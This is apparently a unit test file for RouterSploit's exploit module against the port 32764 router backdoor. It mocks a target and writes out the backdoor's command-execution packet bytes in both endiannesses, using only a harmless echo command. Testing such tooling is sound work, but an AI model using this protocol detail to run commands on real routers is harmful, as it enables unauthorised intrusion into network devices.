from unittest import mock
from routersploit.modules.exploits.routers.multi.tcp_32764_rce import Exploit


@mock.patch("routersploit.modules.exploits.routers.multi.tcp_32764_rce.shell")
def test_check_success1(mocked_shell, tcp_target):
    """ Test scenario - successful check Big Endian"""

    command_mock1 = tcp_target.get_command_mock(b"ABCDE")
    command_mock1.return_value = b"MMcS"

    command_mock2 = tcp_target.get_command_mock(b"ScMM\x00\x00\x00\x07\x00\x00\x00.echo e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00")
    command_mock2.return_value = b"\x41\x41\x41\x41" + b"\x29\x00\x00\x00" + b"\x42\x42\x42\x42" + b"e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00"

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 32764

    exploit.target = tcp_target.host
    exploit.port = tcp_target.port

    assert exploit.check()
    assert exploit.run() is None
    assert exploit.execute("echo e6055cd8c31bf64cfbed8e3247bd11d5c1277c13") == "e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00"


@mock.patch("routersploit.modules.exploits.routers.multi.tcp_32764_rce.shell")
def test_check_success2(mocked_shell, tcp_target):
    """ Test scenario - successful check - Little Endian"""

    command_mock = tcp_target.get_command_mock(b"ABCDE")
    command_mock.return_value = b"ScMM"

    command_mock2 = tcp_target.get_command_mock(b"MMcS\x07\x00\x00\x00.\x00\x00\x00echo e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00")
    command_mock2.return_value = b"\x41\x41\x41\x41" + b"\x00\x00\x00\x29" + b"\x42\x42\x42\x42" + b"e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00"

    exploit = Exploit()

    exploit.target = tcp_target.host
    exploit.port = tcp_target.port

    assert exploit.check()
    assert exploit.run() is None
    assert exploit.execute("echo e6055cd8c31bf64cfbed8e3247bd11d5c1277c13") == "e6055cd8c31bf64cfbed8e3247bd11d5c1277c13\x00"
